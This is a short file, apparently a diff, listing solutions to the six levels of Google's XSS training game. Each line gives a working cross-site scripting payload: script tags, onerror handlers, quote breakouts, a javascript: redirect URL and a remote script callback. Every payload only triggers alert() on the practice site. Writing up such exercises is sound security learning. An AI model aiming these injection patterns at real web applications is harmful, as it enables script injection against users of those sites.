@@ -1,0 +1,6 @@
+First Challenge solution: <script>alert()</script> in the Search Form
+Second Challenge solution: <img src=x onerror="alert('some')"> in the Search Form
+Third Challenge solution: https://xss-game.appspot.com/level3/frame#2' onerror='alert("something");//             "//" used to comment the rest of the code
+Fourth Challenge solution: https://xss-game.appspot.com/level4/frame?timer=3')||alert('4
+Fifth Challenge solution: https://xss-game.appspot.com/level5/frame/signup?next=javascript:alert("stuff")
+Sixth Challenge solution: https://xss-game.appspot.com/level6/frame#HTTPS://www.google.com/jsapi?callback=alert
